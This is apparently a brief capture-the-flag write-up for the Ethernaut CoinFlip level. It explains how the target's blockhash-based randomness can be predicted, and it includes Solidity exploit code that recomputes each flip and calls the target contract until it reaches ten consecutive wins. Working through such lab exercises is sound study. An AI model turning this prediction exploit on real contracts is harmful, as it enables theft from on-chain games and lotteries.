- Understood that the contract depends on previous block hash for randomness

- The value will be accessible before the transaction completes, which means we can replicate the logic and guess correctly

- We can create an exploit contract that repeats the same logic , makes guesses and send the guess to the CoinFlip contract

`
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1;
coinFlipContract.flip(side);
`

- We can call the flip() method by waiting 15 seconds each

- We can check how many wins we have accumulated by

`
await contract.consecutiveWins()).toString();
`

-Once we have hit 10 consecutive wins, we can submit the instance
